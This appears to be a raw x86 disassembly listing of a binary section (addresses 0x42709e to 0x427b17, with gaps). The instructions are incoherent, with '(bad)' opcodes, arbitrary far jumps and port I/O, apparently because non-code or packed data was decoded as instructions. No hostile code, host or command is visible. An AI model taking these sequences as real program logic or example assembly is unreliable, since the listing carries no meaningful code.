  42709e:	stos   DWORD PTR es:[edi],eax
  42709f:	sbb    DWORD PTR [eax+0x6efb92c6],eax
  4270a5:	mov    esi,0x1a081
  4270aa:	pop    es
  4270ab:	add    DWORD PTR [eax],eax
  4270ad:	add    cl,ah
  4270af:	cmp    DWORD PTR [ecx-0x41],ecx
  4270b2:	pop    ecx
  4270b3:	ins    BYTE PTR es:[edi],dx
  4270b4:	les    esp,FWORD PTR [edi-0x4d]
  4270b7:	cwde   
  4270b8:	fcom   QWORD PTR [ebp-0x48]
  4270bb:	add    esp,DWORD PTR [edx]
  4270bd:	retf   0x6523
  4270c0:	daa    
  4270c1:	enter  0x3753,0xff
  4270c5:	out    dx,al
  4270c6:	pop    es
  4270c7:	test   al,0xc4
  4270c9:	add    ch,BYTE PTR [ebp+0xb]
  4270cc:	fdivp  st(1),st
  4270ce:	cwde   
  4270cf:	sbb    BYTE PTR [edi+0x216acaa7],cl
  4270d5:	push   cs
  4270d6:	sub    DWORD PTR [esi-0x33],0x91d45de9
  4270dd:	sti    
  4270de:	jl     0x42714c
  4270e0:	or     edi,DWORD PTR [esi]
  4270e2:	lahf   
  4270e3:	add    DWORD PTR [edi+0x48b269ea],eax
  4270e9:	adc    BYTE PTR [edi+0x5483c343],cl
  4270ef:	cdq    
  4270f0:	mov    al,0x89
  4270f2:	jno    0x42713c
  4270f4:	dec    ecx
  4270f5:	pop    ss
  4270f6:	ficomp DWORD PTR [edi]
  4270f8:	mov    DWORD PTR [ecx+eiz*8+0x38],esi
  4270fc:	call   0x7316966e
  427101:	call   0xe18b2c16
  427106:	aaa    
  427107:	ss mov al,al
  42710a:	adc    ebp,esp
  42710c:	test   al,0x49
  42710f:	xor    ah,cl
  427111:	gs or  eax,0x27225edc
  427117:	mov    bl,0xda
  427119:	rol    DWORD PTR [ecx+ebp*4],cl
  42711c:	adc    al,0xd
  42711e:	cli    
  42711f:	cs int3 
  427121:	cdq    
  427122:	or     ah,BYTE PTR [ecx-0x220e498]
  427128:	in     eax,0xe3
  42712a:	fidiv  DWORD PTR [eax-0x34]
  42712d:	jmp    0xef5b:0x59d163be
  427134:	pop    ebx
  427135:	cwde   
  427136:	shl    DWORD PTR [eax-0x4371ac99],0x68
  42713d:	jl     0x427188
  42713f:	ins    DWORD PTR es:[edi],dx
  427140:	mov    ds,WORD PTR [esi]
  427142:	add    DWORD PTR [eax],0x7b
  427145:	(bad)  
  427147:	dec    esp
  427148:	mov    al,ds:0xf549972b
  42714d:	mov    bl,0xbb
  42714f:	enter  0x88ac,0x51
  427153:	cmp    cl,cl
  427155:	lea    esi,[eax]
  427157:	mov    cl,0x22
  427159:	aam    0x45
  42715b:	shr    BYTE PTR ds:0x449a2f38,cl
  427161:	cwde   
  427162:	out    dx,eax
  427163:	fimul  DWORD PTR ds:0xc1314d15
  427169:	rol    BYTE PTR [ecx+edi*8],cl
  42716c:	or     esi,eax
  42716e:	push   es
  42716f:	and    eax,0x1947d305
  427174:	mov    BYTE PTR [ebx-0x5eb37f7c],dh
  42717a:	adc    BYTE PTR [edx+0x5c],dh
  42717d:	scas   eax,DWORD PTR es:[edi]
  42717e:	out    dx,al
  42717f:	jp     0x4271a1
  427181:	pop    eax
  427182:	and    cl,BYTE PTR [ebp+0x6d]
  427185:	repnz mov bl,0x6c
  427188:	mov    ah,0xb4
  42718a:	inc    esi
  42718b:	popf   
  42718c:	push   ebx
  42718d:	push   cs
  42718e:	fcomp  DWORD PTR [ecx+0x6e]
  427191:	mov    ds:0x20ce9ce3,al
  427196:	rcr    bl,0xf4
  427199:	adc    al,BYTE PTR [edi]
  42719b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42719c:	fwait
  42719d:	outs   dx,DWORD PTR ds:[esi]
  42719e:	jb     0x4271dc
  4271a0:	call   0xe058:0xbd0c06e
  4271a7:	xor    BYTE PTR [ebx],cl
  4271a9:	ins    BYTE PTR es:[edi],dx
  4271aa:	adc    eax,0x6cd94497
  4271af:	call   0x74:0x41a81cf5
	...
  427216:	push   ds
  427217:	inc    ecx
  427218:	fdiv   QWORD PTR [edi+ebx*8+0x77eb7ebd]
  42721f:	push   0xe7c20100
  427224:	jb     0x4271d6
  427226:	mov    BYTE PTR [ecx+0x1070001],ah
  42722c:	add    BYTE PTR [eax],al
  42722e:	int3   
  42722f:	and    BYTE PTR [ecx-0x42],al
  427232:	fisttp DWORD PTR [edx+0x4a2eda29]
  427238:	ins    DWORD PTR es:[edi],dx
  427239:	sbb    esi,DWORD PTR [esi+0x7dcab78]
  42723f:	and    al,bl
  427241:	mov    dl,0xf4
  427243:	xor    al,0xc9
  427245:	mov    DWORD PTR [ebx+edi*4],esi
  427248:	jmp    0x48831561
  42724d:	and    DWORD PTR es:[edi],0x37a54237
  427254:	xchg   ecx,eax
  427255:	ror    ecx,0xb7
  427258:	xor    al,0xd8
  42725a:	shr    BYTE PTR [ecx-0x78],0x39
  42725e:	mov    ds:0x92dcb05f,al
  427263:	fwait
  427264:	adc    ch,0x93
  427267:	out    dx,al
  427268:	lea    esp,[esp+ecx*2]
  42726b:	push   0xffffff8e
  42726d:	loope  0x4272ab
  42726f:	cs adc al,0x26
  427272:	xor    DWORD PTR [ebp-0x7bb63b2d],edx
  427278:	(bad)  
  427279:	dec    esp
  42727a:	dec    eax
  42727b:	add    BYTE PTR [ebp+0x7c94df73],0xf3
  427282:	and    al,0xf0
  427284:	mov    dl,bh
  427286:	push   ebx
  427287:	ret    0xe946
  42728a:	out    0x63,eax
  42728c:	pop    ss
  42728d:	out    0xc3,al
  42728f:	dec    esi
  427290:	sbb    cl,dl
  427292:	push   ss
  427293:	rol    ecx,1
  427295:	xchg   ebp,eax
  427296:	pop    esp
  427297:	jmp    0x72754002
  42729c:	jbe    0x42730b
  42729e:	into   
  42729f:	lds    ecx,FWORD PTR [edi+ebx*2]
  4272a2:	xor    bh,BYTE PTR [ebx]
  4272a4:	dec    esp
  4272a5:	fistp  WORD PTR [edi+eiz*1]
  4272a8:	xor    DWORD PTR gs:0x2fde810c,ebx
  4272af:	lods   eax,DWORD PTR ds:[esi]
  4272b0:	mov    esp,0xb7da54e5
  4272b5:	sbb    eax,0xb6db991a
  4272ba:	xchg   esi,eax
  4272bb:	lahf   
  4272bc:	sbb    eax,0x2cc4e875
  4272c1:	ret    
  4272c2:	out    dx,al
  4272c3:	adc    al,0x7d
  4272c5:	push   0x54
  4272c7:	test   BYTE PTR [eax-0x6a],ch
  4272ca:	xchg   edx,eax
  4272cb:	call   0x73ec03e8
  4272d0:	mov    ebp,0x74005ae6
  4272d5:	dec    esp
  4272d6:	jcxz   0x427336
  4272d9:	mov    ds:0x9ca4148,eax
  4272de:	jns    0x427330
  4272e0:	iret   
  4272e1:	lods   al,BYTE PTR ds:[esi]
  4272e2:	shl    dh,1
  4272e4:	xchg   BYTE PTR [ebx],cl
  4272e6:	lock adc DWORD PTR [esi+0x1a061804],edx
  4272ed:	ss xor al,0xe6
  4272f0:	loope  0x4272fd
  4272f2:	(bad)  
  4272f3:	jmp    0x4272b1
  4272f5:	adc    eax,0x20f7779d
  4272fa:	jmp    0xf91b479b
  4272ff:	push   eax
  427300:	sbb    eax,0xe69b8437
  427306:	clc    
  427307:	fdiv   QWORD PTR [ebp+0x36086aa8]
  42730d:	pop    ds
  42730e:	jo     0x427348
  427310:	pop    ebx
  427311:	mov    edx,0xacb7cf37
  427316:	fnstenv [edx]
  427318:	shl    DWORD PTR [esi],1
  42731a:	mov    cl,BYTE PTR [esi-0x41]
  42731d:	and    eax,ecx
  42731f:	repz jbe 0x4272bb
  427322:	ficom  DWORD PTR [ebx-0x44b35e08]
  427328:	sub    BYTE PTR [esp+ebp*1-0x55],bl
  42732c:	mov    ds:0x1be93f5c,al
  427331:	ret    
  427332:	dec    ebx
  427333:	lods   al,BYTE PTR ds:[esi]
  427334:	mov    al,BYTE PTR [eax]
	...
  427396:	adc    bl,BYTE PTR ds:0xaf3f8832
  42739c:	mov    edx,0x57f28d9f
  4273a1:	push   esp
  4273a2:	mov    edi,0x8fc6558f
  4273a7:	mov    ds:0x1070001,al
  4273ac:	add    BYTE PTR [eax],al
  4273ae:	sbb    eax,0xa3c1e2e1
  4273b3:	jecxz  0x427392
  4273b5:	inc    edi
  4273b6:	dec    edi
  4273b7:	repz sbb eax,0x6f7d0db
  4273bd:	loopne 0x42741d
  4273bf:	mov    esp,0xa80eba6e
  4273c4:	outs   dx,BYTE PTR ds:[esi]
  4273c5:	imul   ebx,DWORD PTR [ebp+0x1acc35f7],0x73c7e62d
  4273cf:	ret    0x7c0e
  4273d2:	mov    WORD PTR [edx],?
  4273d4:	mov    esi,0xb731d9e4
  4273d9:	dec    bx
  4273db:	ret    
  4273dc:	lods   eax,DWORD PTR ds:[esi]
  4273dd:	sub    BYTE PTR [eax-0x3b7101e1],dh
  4273e3:	mov    ah,0x63
  4273e5:	mov    dl,0xf7
  4273e7:	fld    QWORD PTR [edi+0xd81d34d]
  4273ed:	je     0x4273ef
  4273ef:	call   0x880fd7c1
  4273f4:	test   eax,0xe246b6ea
  4273f9:	dec    esi
  4273fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4273fb:	cmp    BYTE PTR [ecx-0x6c093545],0x34
  427402:	sbb    BYTE PTR [ebx-0x24],dl
  427405:	jge    0x427461
  427407:	mov    ch,BYTE PTR [edi+esi*8]
  42740a:	dec    ecx
  42740b:	add    eax,0x2be256c3
  427410:	out    dx,al
  427411:	aas    
  427412:	xor    edx,DWORD PTR [edx-0x2b]
  427415:	push   ecx
  427416:	dec    ecx
  427417:	lea    edx,[ecx+0x5b]
  42741a:	pop    ebp
  42741b:	cdq    
  42741c:	jnp    0x427488
  42741e:	mov    ch,dh
  427420:	sub    ebp,esp
  427422:	or     BYTE PTR ds:0x5a0bdc11,bl
  427428:	push   ss
  427429:	sub    dh,bl
  42742b:	pop    ss
  42742c:	pop    esp
  42742d:	mul    DWORD PTR ds:[ebp-0x69]
  427431:	lods   eax,DWORD PTR ds:[esi]
  427432:	pop    ds
  427433:	fsub   QWORD PTR [ecx+esi*4-0x68ef9832]
  42743a:	jecxz  0x4274a8
  42743c:	rcr    BYTE PTR [esi+0x384e9d43],0xbb
  427443:	loop   0x4274b0
  427445:	cmc    
  427446:	xchg   ebx,eax
  427447:	rcl    BYTE PTR [esp+esi*1],1
  42744a:	fstp   DWORD PTR ds:0x19acdc4b
  427450:	(bad)  
  427451:	cli    
  427452:	and    dl,BYTE PTR [ecx+0x24]
  427455:	push   eax
  427456:	(bad)  
  427458:	dec    esp
  427459:	xchg   esi,eax
  42745a:	mov    eax,0xea43c8b0
  42745f:	xchg   ah,al
  427461:	adc    DWORD PTR [edx],ecx
  427463:	push   0x691aaca5
  427468:	es lahf 
  42746a:	mov    ds:0x9c3d5ea9,eax
  42746f:	data16 mov cl,0xce
  427472:	out    0x7,eax
  427474:	inc    esp
  427475:	scas   al,BYTE PTR es:[edi]
  427476:	scas   eax,DWORD PTR es:[edi]
  427477:	mov    BYTE PTR [ebx+0x3],cl
  42747a:	sub    BYTE PTR [ebp-0x465a1b29],0x26
  427481:	jecxz  0x4274a7
  427483:	scas   eax,DWORD PTR es:[edi]
  427484:	mov    bh,0x8d
  427486:	jo     0x42744a
  427488:	daa    
  427489:	inc    ebx
  42748a:	jge    0x42742b
  42748c:	push   0x59
  42748e:	js     0x427429
  427490:	dec    edx
  427491:	inc    BYTE PTR [eax-0x36c1b5a7]
  427497:	pop    ss
  427498:	dec    cx
  42749a:	mov    dh,0xdd
  42749c:	aaa    
  42749d:	out    0x3a,al
  42749f:	mov    ebp,0xba332184
  4274a4:	dec    edx
  4274a5:	stos   BYTE PTR es:[edi],al
  4274a6:	cs getsec 
  4274a9:	push   edx
  4274aa:	gs sahf 
  4274ac:	and    DWORD PTR [ecx],ecx
  4274ae:	data16 lahf 
  4274b0:	jmp    0x0:0x4e2f05a7
	...
  427513:	add    BYTE PTR [eax],al
  427515:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	hlt    
  42751b:	jmp    0x42759c
  42751d:	jmp    DWORD PTR [ecx+0x4a6f50a]
  427523:	xchg   edi,eax
  427524:	adc    BYTE PTR [ecx-0x6a],ch
  427527:	mov    ds:0x1070001,eax
  42752c:	add    BYTE PTR [eax],al
  42752e:	mov    ah,BYTE PTR [ebx+eiz*2+0x42]
  427532:	popf   
  427533:	test   DWORD PTR [esi+0x43f7e476],edi
  427539:	cmp    eax,ebp
  42753b:	in     eax,dx
  42753c:	lds    ebx,FWORD PTR [edi+0x2b6716f3]
  427542:	fidivr DWORD PTR [ebp-0x35]
  427545:	jmp    0x5ebb:0x75bab75
  42754c:	pop    ss
  42754d:	aas    
  42754e:	icebp  
  42754f:	jp     0x427549
  427551:	popa   
  427552:	inc    esp
  427553:	test   dl,al
  427555:	pop    esp
  427556:	jb     0x4275b7
  427558:	push   ds
  427559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42755a:	jp     0x427527
  42755c:	jno    0x4275b4
  42755e:	inc    eax
  42755f:	loope  0x4274f3
  427561:	xor    dl,BYTE PTR [edx+0x77]
  427564:	push   0x5f
  427566:	jo     0x4275c9
  427568:	xchg   ebx,eax
  427569:	out    0xfb,al
  42756b:	add    DWORD PTR [edx+0x47c769ff],ebp
  427571:	push   0x67fe9ef6
  427576:	inc    ecx
  427577:	sub    esi,DWORD PTR [eax+0x531c3439]
  42757d:	retf   
  42757e:	and    BYTE PTR [ecx+0x4e623d1a],bh
  427584:	push   edx
  427585:	ret    
  427586:	push   0x701f82e0
  42758b:	stos   DWORD PTR es:[edi],eax
  42758c:	scas   al,BYTE PTR es:[edi]
  42758d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42758e:	setg   BYTE PTR [edx-0x4e]
  427592:	mov    al,0xd9
  427594:	scas   al,BYTE PTR es:[edi]
  427595:	inc    esi
  427596:	call   0x14a7:0xb97d3a58
  42759d:	pop    ebp
  42759e:	(bad)  
  4275a0:	push   ebx
  4275a1:	test   ch,al
  4275a3:	inc    eax
  4275a4:	sub    al,BYTE PTR [ebp+0x2669cf8]
  4275aa:	jne    0x42753f
  4275ac:	xor    bh,BYTE PTR ds:0x14801ddb
  4275b2:	sbb    eax,0x5b244b6f
  4275b7:	iret   
  4275b8:	add    BYTE PTR [ecx],bh
  4275ba:	das    
  4275bb:	sub    ch,ah
  4275bd:	jnp    0x42759f
  4275bf:	cmc    
  4275c0:	xor    bh,dh
  4275c2:	mov    es,WORD PTR ds:0x991b11d1
  4275c8:	outs   dx,BYTE PTR ds:[esi]
  4275c9:	jno    0x4275f7
  4275cb:	ds cmc 
  4275cd:	in     eax,0x20
  4275cf:	mov    dh,BYTE PTR [ebp+0x28]
  4275d2:	das    
  4275d3:	scas   al,BYTE PTR es:[edi]
  4275d4:	jl     0x4275de
  4275d6:	mov    eax,ecx
  4275d8:	push   ebp
  4275d9:	ret    0xc7e5
  4275dc:	ins    DWORD PTR es:[edi],dx
  4275dd:	das    
  4275de:	sbb    DWORD PTR [eax+ebp*4],edx
  4275e1:	push   0x9dbb2568
  4275e6:	push   es
  4275e7:	fnstcw WORD PTR [ecx+0x59982258]
  4275ed:	jl     0x4275fc
  4275ef:	mov    eax,ds:0x39c23269
  4275f4:	fst    QWORD PTR [ebx]
  4275f6:	xlat   BYTE PTR ds:[ebx]
  4275f7:	shl    DWORD PTR [ebp-0x6b38fad9],0x4d
  4275fe:	xor    BYTE PTR [ebp-0x5bfa8349],al
  427604:	hlt    
  427605:	mov    bl,0x9d
  427607:	hlt    
  427608:	and    al,0x6d
  42760a:	cwde   
  42760b:	sub    al,0xb4
  42760d:	out    0x91,eax
  42760f:	call   0x23ae431d
  427614:	xchg   esi,eax
  427615:	xor    BYTE PTR ds:0x2345ea75,bl
  42761b:	sbb    dl,BYTE PTR [ebx+0x491110da]
  427621:	shl    dl,1
  427623:	pusha  
  427624:	in     al,0xdb
  427626:	das    
  427627:	and    ebx,DWORD PTR [edx-0x513ee6f5]
  42762d:	sbb    eax,0x7961c160
  427632:	push   esi
  427633:	mov    ?,eax
	...
  427695:	add    BYTE PTR [ecx],al
  427697:	push   esi
  427698:	nop
  427699:	out    dx,al
  42769a:	xlat   BYTE PTR ds:[ebx]
  42769b:	out    dx,al
  42769c:	jg     0x42769d
  42769e:	xchg   edi,eax
  42769f:	in     eax,dx
  4276a0:	imul   ebx,eax,0x13833f31
  4276a6:	popf   
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	add    DWORD PTR [eax],eax
  4276aa:	pop    es
  4276ab:	add    DWORD PTR [eax],eax
  4276ad:	add    BYTE PTR [ebp+0x73],cl
  4276b0:	imul   edi,DWORD PTR [esi+0xf061db9],0x894c6bdc
  4276ba:	dec    edx
  4276bb:	loope  0x427669
  4276bd:	add    al,0x54
  4276bf:	xor    eax,0xd8bd47a0
  4276c4:	adc    al,0xb9
  4276c6:	or     DWORD PTR [ebx],ebx
  4276c8:	hlt    
  4276c9:	pusha  
  4276ca:	mov    WORD PTR [ecx],gs
  4276cc:	or     BYTE PTR [ebx],bl
  4276ce:	mov    DWORD PTR [ebp-0x7f8f92bc],edx
  4276d4:	push   ss
  4276d5:	push   ecx
  4276d6:	xor    ebx,0x11a23af2
  4276dc:	or     bh,BYTE PTR [edi]
  4276de:	mov    eax,0xa96db38
  4276e3:	inc    eax
  4276e4:	pusha  
  4276e5:	push   es
  4276e6:	ret    0x84a6
  4276e9:	cmp    ebx,DWORD PTR [edx]
  4276eb:	(bad)  
  4276ec:	mov    cl,0x54
  4276ee:	or     dh,BYTE PTR [eax]
  4276f0:	sti    
  4276f1:	cld    
  4276f2:	mov    dh,0xce
  4276f4:	lods   al,BYTE PTR ds:[esi]
  4276f5:	push   0xfffffff3
  4276f7:	and    BYTE PTR [ebp+0x5c],cl
  4276fa:	cmc    
  4276fb:	out    dx,al
  4276fc:	add    BYTE PTR [eax+0x2e],0xfb
  427700:	or     BYTE PTR [ebx-0x55],ah
  427703:	test   DWORD PTR [edx+0x53387c5],0x7d001f48
  42770d:	add    dl,cl
  42770f:	lock aam 0x9
  427712:	inc    edi
  427713:	lahf   
  427714:	(bad)  
  427715:	pushf  
  427716:	repnz xchg edi,eax
  427718:	xchg   ebx,eax
  427719:	or     al,0xc4
  42771b:	gs jnp 0x42773a
  42771e:	ins    BYTE PTR es:[edi],dx
  42771f:	bound  eax,QWORD PTR [eax-0x7341f3c0]
  427725:	shr    BYTE PTR [ecx-0x4a],cl
  427728:	lahf   
  427729:	mov    eax,ds:0x2f08be77
  42772e:	or     al,BYTE PTR [ecx]
  427730:	lods   eax,DWORD PTR ds:[esi]
  427731:	mov    DWORD PTR [ebx-0x5efad27e],ecx
  427737:	pop    edx
  427738:	repnz inc esi
  42773a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42773b:	addr16 mov ah,0xe5
  42773e:	sbb    dl,BYTE PTR [edi]
  427740:	scas   al,BYTE PTR es:[edi]
  427741:	xchg   esp,eax
  427742:	retf   0xeb26
  427745:	fisubr WORD PTR [ebx-0x2654a84e]
  42774b:	mov    ah,0x14
  42774d:	xchg   esp,eax
  42774e:	mov    dh,0xaa
  427750:	aad    0x71
  427752:	xor    eax,0xe81d6069
  427757:	ret    
  427758:	mov    ch,0xf
  42775a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42775b:	pop    esp
  42775c:	and    ebp,ebx
  42775e:	rcr    DWORD PTR [esi-0x533dfa56],0xe6
  427765:	lods   al,BYTE PTR ds:[esi]
  427766:	add    eax,0x81677221
  42776b:	in     eax,dx
  42776c:	leave  
  42776d:	dec    edi
  42776e:	pop    DWORD PTR [eax+ecx*2+0x51]
  427772:	push   esp
  427773:	sar    DWORD PTR [eax],cl
  427775:	fs test al,0x12
  427778:	enter  0xb93e,0x99
  42777c:	add    al,0x94
  42777e:	inc    esp
  42777f:	pop    edi
  427780:	out    0xdb,al
  427782:	das    
  427783:	dec    ecx
  427784:	test   eax,0x4d0b4772
  427789:	inc    eax
  42778a:	sbb    eax,0x2f9e6e9d
  42778f:	push   ecx
  427790:	adc    cl,0x76
  427793:	(bad)  
  427794:	rcr    BYTE PTR [ebx-0x43],cl
  427797:	lahf   
  427798:	dec    ecx
  427799:	mov    ah,0x6c
  42779b:	pop    ebx
  42779c:	scas   al,BYTE PTR es:[edi]
  42779d:	mov    eax,0x79a57e10
  4277a2:	xchg   ecx,eax
  4277a3:	addr16 mov ah,0x39
  4277a6:	inc    ebx
  4277a7:	cmp    BYTE PTR ds:[ecx+0x60ee8949],ah
  4277ae:	js     0x4277ae
  4277b0:	sbb    ecx,DWORD PTR [ebx+0x6c5573]
	...
  427816:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42781c:	pop    esi
  42781d:	fist   WORD PTR [edx-0x2f]
  427820:	cmp    al,0x27
  427822:	iret   
  427823:	pop    esp
  427824:	xor    ecx,edi
  427826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427828:	add    DWORD PTR [eax],eax
  42782a:	pop    es
  42782b:	add    DWORD PTR [eax],eax
  42782d:	add    BYTE PTR ds:0xac1a197f,dl
  427833:	stos   DWORD PTR es:[edi],eax
  427834:	xor    al,0xb3
  427836:	fnstsw WORD PTR [ecx+0x1f504254]
  42783c:	sub    al,0xf8
  42783e:	xchg   esp,esp
  427840:	mov    cl,0xcb
  427842:	mov    DWORD PTR [ecx+0x4d],ebx
  427845:	popf   
  427846:	push   0x3e
  427848:	push   eax
  427849:	bound  edx,QWORD PTR [eax]
  42784b:	push   ds
  42784c:	fwait
  42784d:	inc    BYTE PTR [esi-0x6d0dc20d]
  427853:	cmp    cl,0xa6
  427856:	inc    esi
  427857:	test   al,0x41
  427859:	das    
  42785a:	scas   al,BYTE PTR es:[edi]
  42785b:	jnp    0x4278b6
  42785d:	(bad)  
  42785e:	push   di
  427860:	clc    
  427861:	dec    esp
  427862:	cmp    DWORD PTR [edx],edi
  427864:	push   eax
  427865:	rol    DWORD PTR [edx-0x51f4aa0b],cl
  42786b:	sbb    DWORD PTR [eax+0x74af9b9f],0xffffffa7
  427872:	pop    es
  427873:	pop    esi
  427874:	lock pusha 
  427876:	shl    al,0x31
  427879:	or     edi,DWORD PTR [ebx+0x67]
  42787c:	ret    0xa211
  42787f:	jno    0x427850
  427881:	mov    cl,0x25
  427883:	or     DWORD PTR [edi-0x15],edi
  427886:	pop    ecx
  427887:	mov    cl,0xc2
  427889:	retf   
  42788a:	pop    es
  42788b:	mov    edx,0x1e93ca6
  427890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427891:	or     al,0x14
  427893:	mov    al,0xb4
  427895:	and    esi,esi
  427897:	xor    cl,BYTE PTR [edx+0x6ca998b3]
  42789d:	inc    edx
  42789e:	fucompp 
  4278a0:	test   DWORD PTR [ebp+0x75ca2475],ebp
  4278a6:	jne    0x4278c4
  4278a8:	add    al,0xde
  4278aa:	adc    DWORD PTR [esi-0x42],0x8a40380c
  4278b1:	inc    ecx
  4278b2:	int3   
  4278b3:	mov    ah,0x9b
  4278b5:	pop    edi
  4278b6:	sar    BYTE PTR [esi+0x746b0631],cl
  4278bc:	iret   
  4278bd:	ret    
  4278be:	pop    ebp
  4278bf:	call   0x2064cffa
  4278c4:	xor    bh,0x8e
  4278c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278c8:	sar    ah,0x67
  4278cb:	(bad)  
  4278cc:	pusha  
  4278cd:	mov    edi,0x8bd35868
  4278d2:	cld    
  4278d3:	ror    BYTE PTR [edi-0x14f961dd],cl
  4278d9:	xchg   esp,eax
  4278da:	data16 fdivrp st(6),st
  4278dd:	dec    eax
  4278de:	and    DWORD PTR ds:0x5acd43cc,ecx
  4278e4:	mov    edi,0xc0a3ba6a
  4278e9:	fs mov esi,0x588c16ad
  4278ef:	dec    ebp
  4278f0:	retf   
  4278f1:	and    DWORD PTR [ebx+0x12],edi
  4278f4:	mov    al,0x83
  4278f6:	fild   WORD PTR [edi+0x1aa4f9da]
  4278fc:	jle    0x42792c
  4278fe:	inc    edi
  4278ff:	xor    BYTE PTR [ebx+0x1200b3f5],bl
  427905:	add    al,0x22
  427907:	mov    al,ds:0x878c35c
  42790c:	das    
  42790d:	add    ebx,DWORD PTR [edi+0x48]
  427910:	jae    0x4278d9
  427912:	inc    esi
  427913:	test   DWORD PTR [ebx-0x1b],ebx
  427916:	stc    
  427917:	xor    cl,dh
  427919:	ja     0x42791f
  42791b:	cwde   
  42791c:	repz mov ecx,0xc9ef2f3
  427922:	cmc    
  427923:	into   
  427924:	jecxz  0x42797f
  427926:	(bad)  
  427927:	or     eax,eax
  427929:	jmp    FWORD PTR [eax]
  42792b:	xchg   edi,eax
  42792c:	cmp    BYTE PTR [ebx-0x7bc8e60a],ch
  427932:	je     0x42799b
  427934:	xlat   BYTE PTR ds:[ebx]
	...
  427995:	add    BYTE PTR [edx-0x5c0023],bl
  42799b:	mov    ds:0x63e5fdde,eax
  4279a0:	mov    ebx,0x18fac1d0
  4279a5:	out    dx,al
  4279a6:	stos   DWORD PTR es:[edi],eax
  4279a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279a8:	add    DWORD PTR [eax],eax
  4279aa:	pop    es
  4279ab:	add    DWORD PTR [eax],eax
  4279ad:	add    BYTE PTR [edx-0x732cabcc],dh
  4279b3:	sar    BYTE PTR [ecx-0x5],cl
  4279b6:	and    al,0xa6
  4279b8:	cs mov ch,0xc9
  4279bb:	cmp    ah,BYTE PTR [ebx-0x2e]
  4279be:	lods   al,BYTE PTR ds:[esi]
  4279bf:	push   eax
  4279c0:	ins    BYTE PTR es:[edi],dx
  4279c1:	jo     0x427a33
  4279c3:	pushf  
  4279c4:	pop    ebx
  4279c5:	test   BYTE PTR [ebp+0x4c5f826a],bl
  4279cb:	call   DWORD PTR [ecx]
  4279cd:	push   edx
  4279ce:	jb     0x4279cc
  4279d0:	inc    ecx
  4279d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279d2:	pop    esp
  4279d3:	mov    esi,0x162e6041
  4279d8:	sub    DWORD PTR gs:[ebx-0x3c],esp
  4279dc:	add    ch,BYTE PTR [eax+0x1e]
  4279df:	fidiv  DWORD PTR [edx]
  4279e1:	push   ss
  4279e2:	es and edx,ecx
  4279e5:	aad    0x3c
  4279e7:	lahf   
  4279e8:	xor    al,0xd9
  4279ea:	adc    al,0x3d
  4279ec:	add    BYTE PTR [edi],cl
  4279ee:	jmp    0x4279a6
  4279f0:	sar    BYTE PTR [esi],1
  4279f2:	cli    
  4279f3:	cld    
  4279f4:	(bad)  
  4279f6:	or     ecx,DWORD PTR [edx]
  4279f8:	xchg   esi,eax
  4279f9:	sbb    eax,0x7e234ab2
  4279fe:	arpl   WORD PTR [esi+0x32],ax
  427a01:	sub    BYTE PTR [esi],dl
  427a03:	inc    ecx
  427a04:	jmp    0xcab9:0x2cdc5568
  427a0b:	sbb    al,0x23
  427a0d:	sbb    ch,ch
  427a0f:	inc    ecx
  427a10:	test   DWORD PTR [ebp+esi*2-0x11],edi
  427a14:	in     eax,0x5c
  427a16:	fnclex 
  427a18:	xor    DWORD PTR [edx],ebp
  427a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a1b:	cmp    BYTE PTR [ebx-0xcd3fa1b],al
  427a21:	imul   bx,WORD PTR [ebp+0x73],0x781b
  427a27:	fsub   QWORD PTR [ecx-0x1b2d5b30]
  427a2d:	or     ch,BYTE PTR [edx+0x4efe2dd7]
  427a33:	jecxz  0x427a5c
  427a35:	call   0x4037:0x8dee7282
  427a3c:	fucompp 
  427a3e:	jo     0x4279f1
  427a40:	mov    eax,0x137ee6af
  427a45:	push   ds
  427a46:	mov    ?,WORD PTR [ebx+0x516d12bb]
  427a4c:	je     0x4279eb
  427a4e:	or     eax,0x9d20c899
  427a53:	clc    
  427a54:	and    ebx,DWORD PTR [esi+0xa30e6ec]
  427a5a:	add    eax,0xb805b9bd
  427a5f:	cmp    BYTE PTR [eax-0x53],bl
  427a62:	or     BYTE PTR [edx+0x3c],bl
  427a65:	push   ecx
  427a66:	pop    edi
  427a67:	jno    0x427a21
  427a69:	popf   
  427a6a:	jge    0x427a40
  427a6c:	fld    QWORD PTR [esi+edx*2-0x27]
  427a70:	lods   eax,DWORD PTR ds:[esi]
  427a71:	pop    es
  427a72:	in     eax,dx
  427a73:	cmp    al,0x75
  427a75:	shl    BYTE PTR [ecx],1
  427a77:	mov    ch,0x57
  427a79:	dec    bl
  427a7b:	imul   ebp,DWORD PTR [ebx],0x4e9c07aa
  427a81:	sti    
  427a82:	or     dl,cl
  427a84:	jns    0x427a5f
  427a86:	pusha  
  427a87:	adc    DWORD PTR [ecx+eiz*2+0x10],esp
  427a8b:	imul   esp,ebx,0x1b
  427a8e:	mov    edi,DWORD PTR [ecx+0x4b6bf00e]
  427a94:	idiv   BYTE PTR [eax]
  427a96:	arpl   WORD PTR [edi+0x16],ax
  427a99:	dec    ecx
  427a9a:	push   0xfffffffa
  427a9c:	jmp    0x811c8083
  427aa1:	js     0x427a2b
  427aa3:	div    BYTE PTR [ebx-0x65]
  427aa6:	sbb    ecx,DWORD PTR [ebx-0x65f908f5]
  427aac:	adc    ah,bh
  427aae:	mov    bh,0x19
  427ab0:	add    bl,BYTE PTR [esi-0x45]
  427ab3:	dec    edi
  427ab4:	pop    esi
	...
  427b15:	add    dl,cl
  427b17:	mov    edx,DWORD PTR [edx+0x7b]
